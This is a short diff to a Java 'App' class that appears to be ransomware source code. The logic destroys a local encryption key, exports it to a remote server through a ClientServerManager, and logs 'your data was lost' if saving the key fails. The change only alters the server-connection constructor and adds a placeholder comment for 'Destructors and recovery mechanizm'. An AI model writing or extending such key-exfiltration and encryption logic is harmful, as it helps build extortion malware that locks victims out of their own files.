@@ -49,7 +49,7 @@ public class App {
 
 				// Export Key
 				String key = encryptionManager.destroyKey();
-				ClientServerManager myserver = new ClientServerManager(Configuration.getSimpleConnexion());
+				ClientServerManager myserver = new ClientServerManager();
 				try {
 					myserver.exportKey(key);
 					stateManager.markExported();
@@ -77,7 +77,7 @@ public class App {
 						logger.log(Level.SEVERE, "Sorry can not save key your data was lost");
 						System.exit(1);
 					}
-					ClientServerManager myserver = new ClientServerManager(Configuration.getSimpleConnexion());
+					ClientServerManager myserver = new ClientServerManager();
 					try {
 						myserver.exportKey(key);
 						stateManager.markExported();
@@ -88,7 +88,9 @@ public class App {
 			}
 
 		} else {
-
+			
+			
+			/// Destructors and recovery mechanizm
 		}
 	}
 
